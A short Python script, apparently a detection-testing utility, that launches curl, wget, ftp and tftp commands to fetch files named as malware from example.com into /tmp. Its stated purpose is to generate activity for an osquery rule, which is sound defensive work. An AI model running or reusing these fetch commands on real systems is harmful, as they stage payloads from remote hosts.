import os
import time
import subprocess

# List of commands to mimic suspicious fetch activities
fetch_commands = [
    "curl -s -o /tmp/malicious.sh http://example.com/malware.sh",
    "wget -q -O /tmp/malicious.bin http://example.com/malware.bin",
    "ftp -n <<END_SCRIPT\nopen example.com\nuser anonymous\nget badfile\nbye\nEND_SCRIPT",
    "tftp -m binary example.com -c get exploit.bin"
]

def execute_fetch_commands():
    print("[*] Executing suspicious fetch commands...")

    for cmd in fetch_commands:
        try:
            subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print(f"[+] Executed: {cmd}")
        except Exception as e:
            print(f"[-] Failed to execute {cmd}: {e}")

def main():
    print("[*] Simulating unexpected file-fetching activity for osquery detection...")

    execute_fetch_commands()

    print("[*] Waiting for the query interval to pass...")
    time.sleep(10)

    print("[*] Simulation completed. Run your osquery query now.")

if __name__ == "__main__":
    main()
